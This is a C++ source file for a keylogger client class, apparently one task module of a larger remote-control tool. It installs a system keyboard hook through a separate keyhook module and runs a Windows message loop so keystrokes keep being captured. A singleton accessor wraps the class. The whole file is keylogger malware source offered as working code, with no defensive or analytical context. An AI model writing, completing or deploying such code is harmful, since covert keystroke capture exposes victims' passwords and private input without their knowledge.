#include "keylogger_client.h"
#include <task\client_tasks\keylogger\keyhook.h>


keylogger_client::keylogger_client()
{
}

bool keylogger_client::capture_keys()
{
	if (install_hook())
		return false;

	while (bRet = GetMessage(&msg, NULL, 0, 0))
	{
		if (bRet == -1)
		{
			// Handle the Error
			// Possibly Exit
		}
		else
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return true;
}

bool keylogger_client::install_hook()
{
	return keyhook::InstallHook();
}

keylogger_client* keylogger_client::get()
{
	static keylogger_client* singleton = nullptr;
	if (!singleton)
		singleton = new keylogger_client();

	return singleton;
}